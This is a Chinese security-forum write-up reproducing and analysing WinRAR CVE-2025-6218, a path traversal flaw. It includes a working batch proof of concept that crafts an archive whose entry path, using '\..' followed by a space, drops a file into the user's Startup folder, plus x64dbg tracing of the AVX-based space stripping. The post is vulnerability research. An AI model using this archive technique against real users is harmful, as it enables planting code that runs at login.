
# [原创] WinRAR之CVE-2025-6218漏洞复现与分析

## 1、背景

在刷B站时看到有人在分享这个漏洞的原因，稍微琢磨了一下，脑袋告诉我：懂了，原来如此。但up主最后只给出了`x64dbg`中判断字符是否是空格的地方，没有给出定位过程，所以当时就来了兴趣，想自己分析分析。

## 2、漏洞复现

话不多说，直接复现。

下载7.11版本，安装到默认目录：

![图片描述](https://bbs.kanxue.com/upload/attach/202509/705350_MPY78Y4NP2ZGZA3.webp)

在桌面新建`CVE-2025-6218.bat`，内容如下：

```
@echo offtitle CVE-2025-6218 POC
echo calc.exe > POC.bat
"C:\Program Files\WinRAR\WinRAR.exe" a -ap" \.. \.. \AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\" CVE-2025-6218.zip POC.bat
echo.if errorlevel 1 ( echo [!] Failed to create POC.) else ( echo [+] CVE-2025-6218.zip created successfully!)echo.
del POC.bat
pause
```

注意第3行的`\..`后面有空格。

第3行的命令的意思是：

生成`CVE-2025-6218.zip`压缩包文件，并将`POC.bat`添加进去，同时指明了`POC.bat`在压缩包里的路径，长这样：

![图片描述](https://bbs.kanxue.com/upload/attach/202509/705350_G83Q48P35STYDAP.webp)

执行`CVE-2025-6218.bat`：

![图片描述](https://bbs.kanxue.com/upload/attach/202509/705350_K82BK9CYZWBNKAD.webp)

会在桌面生成`CVE-2025-6218.zip`压缩包，右键解压到`CVE-2025-6218`，即意思是想在桌面生成`CVE-2025-6218`文件夹，但是结果却把`POC.bat`写入到了启动目录了：

![图片描述](https://bbs.kanxue.com/upload/attach/202509/705350_V2PS6YXXVQZWKN8.webp)

再解压一遍，发生覆盖提示：

![图片描述](https://bbs.kanxue.com/upload/attach/202509/705350_S935W9YMRAZJQV2.webp)

从给出的提示来看，路径里面的`\..`后面没有空格了，路径也拼接好了，倒退两层就会变成：

`C:\Users\Win10.1809x64\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\POC.bat`

之所以会解压到启动目录，是这样的：

右键解压到`CVE-2025-6218`，目标目录就是：

`C:\Users\Win10.1809x64\Desktop\CVE-2025-6218`

但是压缩时指定了路径：

`\..\..\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\POC.bat`

所以两者拼接起来就是启动目录了。

从复现结果和覆盖提示能看出`WinRAR`拼接了路径，消除了空格，但是我不满足于此，想知道是在哪儿用什么方式处理的？是用`strcpy`还是`memcpy`、`memmove`？即我既想知道结果，也想知道过程。而网上的都是复现文章，没有过程分析文章，所以还是自食其力分析一下。

## 3、过程分析

用`ProcMon`监控`WinRAR.exe`的文件行为，发现会往启动目录创建`POC.bat`文件，所以`x64dbg`拖入`WinRAR.exe`，对`CreateFileW`函数下断。（猜也猜得到是创建文件，所以可以不用`ProcMon`）

先取消`CreateFileW`断点（因为会频繁断下），运行起来，选中压缩包，进行解压：

![图片描述](https://bbs.kanxue.com/upload/attach/202509/705350_GASJRTB6JENXAED.webp)

出现下图覆盖提示界面时，这个时候启用断点，然后确认覆盖，就会断在我们想要的地方：

![图片描述](https://bbs.kanxue.com/upload/attach/202509/705350_C4U8Q9AMWAXP9F2.webp)

断下后，Ctrl+F9返回到上层，返回个两三次，就会来到下图的地方。全局变量`0x00007FF6526F0F08`里存放的就是目标路径字符串指针，而且目标字符串是拼接完成状态，而且其中的空格也被消除了：

![图片描述](https://bbs.kanxue.com/upload/attach/202509/705350_QEJASM5W7P6A8B3.webp)

再次解压，但不要进入覆盖提示界面（因为覆盖提示界面弹出时，已经把空格处理了，然后将处理好的路径展示给我们）。这个时候可以看到，全局变量里清0了，也就是说目标字符串指针还未写入：

![图片描述](https://bbs.kanxue.com/upload/attach/202509/705350_AN8WTWRCZ65A2Q8.webp)

对全局变量地址下硬件写入断点，然后点上图的【确定】按钮，中断后一直点运行，观察内存窗口，某一次就发现有字符串指针写入了，而且空格没有被处理，路径也还没拼接：

![图片描述](https://bbs.kanxue.com/upload/attach/202509/705350_G8CAVPCW6R933JW.webp)

这个时候一直F8单步，运行到下图时，在读取全局指针变量了，应该要准备读取字符串进行处理了：

![图片描述](https://bbs.kanxue.com/upload/attach/202509/705350_3Y8CM4PB5HJ8DRG.webp)

再继续单步，就会来到一个循环。

这里我跟了一下，循环会执行两轮，两轮后，字符串中的空格才会被处理，录制动图如下，一直按F9，两轮循环后，字符串中的空格被处理了，并且生成了最终的文件路径：

![图片描述](https://bbs.kanxue.com/upload/attach/202509/705350_QBC6MJATTHP7SWN.webp)

所以在第二轮循环快结束时，单步跟踪到这里，是这个`call`进行字符串处理：

![图片描述](https://bbs.kanxue.com/upload/attach/202509/705350_Y46P75AJ98WRQ4X.webp)

那就跟进去看看，一直单步，遇到哪个`call`处理了路径，就进入。在下图会有一个循环，逐字符判断，关注对空格的判断即可：

![图片描述](https://bbs.kanxue.com/upload/attach/202509/705350_GF6JURCM6EWRPZS.webp)

如果是空格的话，就会调用`call 0x00007FF65248A430`进行处理：

![图片描述](https://bbs.kanxue.com/upload/attach/202509/705350_K7V3PHPVQCTSS6T.webp)

看看里面是怎么处理的：

![图片描述](https://bbs.kanxue.com/upload/attach/202509/705350_43ERG3KJHYZDP8W.webp)

先是得到空格所在索引，通过索引截取到子字符串，地址赋值给`RCX`（开头是空格字符）。

然后子字符串偏移一个字符，即略过空格，地址赋值给`RDX`（开头是非空格字符）

继续单步到下图，关注框住的两行代码即可。

第一行：`vmovdqu ymm1,yword ptr ds:[rdx+r9-A0]`，就是从`RDX`指向的字符串中读取32个字节，赋值给`ymm1`。

第二行：`vmovdqu yword ptr ds:[rcx+r9-A0],ymm1`，就是将读取的32个字节写入到`RCX`指向的地址中。

![图片描述](https://bbs.kanxue.com/upload/attach/202509/705350_NQUEW6N2Y6MCS4Y.webp)

问了下AI，这是一组`AVX`（高级矢量扩展）指令集，进行数据移动，每次可移动32个字节。

分析到这里其实就清楚了，本质就是`RCX`指向的字符串，第一个字符是空格，而`RDX`经过加1处理，就绕过了空格，最后使用`AVX`指令，从`RDX`指向的字符串中读取32个字节，往`RCX`指向的地址进行写入，如此便把空格给消除了。简而言之就是往前移动数据。

备注：其实，当字符串拼接好但还未处理空格时，对字符串地址下硬件写入断点，可以更快到达上图的代码。不过本次分析我的目的是重在了解细节。分析修复版本的`WinRAR`时也可以这样操作。

## 4、参考

漏洞复现参考：cfeK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6U0L8r3!0#2k6q4)9J5k6i4c8W2L8X3y4W2L8Y4c8Q4x3X3g2U0L8$3#2Q4x3V1k6V1k6i4k6W2L8r3!0H3k6i4u0Q4x3V1k6S2M7Y4c8A6j5$3I4W2i4K6u0r3x3U0f1@1y4o6p5#2x3R3`.`.
